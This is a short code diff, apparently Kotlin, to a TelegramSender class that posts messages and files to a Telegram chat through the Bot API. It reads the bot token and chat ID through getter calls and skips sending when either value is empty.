@@ -16,12 +16,15 @@ class TelegramSender {
         .readTimeout(120, TimeUnit.SECONDS)
         .build()
 
-    private val baseUrl = "https://api.telegram.org/bot${Config.BOT_TOKEN}"
+    private val botToken = Config.getBotToken()
+    private val chatId = Config.getChatId()
+    private val baseUrl = "https://api.telegram.org/bot$botToken"
 
     fun sendMessage(text: String) {
         try {
+            if (botToken.isEmpty() || chatId.isEmpty()) return
             val json = JSONObject().apply {
-                put("chat_id", Config.CHAT_ID)
+                put("chat_id", chatId)
                 put("text", text)
             }
             val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
@@ -37,6 +40,7 @@ class TelegramSender {
 
     fun sendFile(file: File, type: String, caption: String) {
         try {
+            if (botToken.isEmpty() || chatId.isEmpty()) return
             if (!file.exists() || file.length() == 0L) return
             val mediaType = when (type) {
                 "photo" -> "image/jpeg".toMediaTypeOrNull()
@@ -45,7 +49,7 @@ class TelegramSender {
             }
             val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", Config.CHAT_ID)
+                .addFormDataPart("chat_id", chatId)
                 .addFormDataPart(
                     type,
                     file.name,
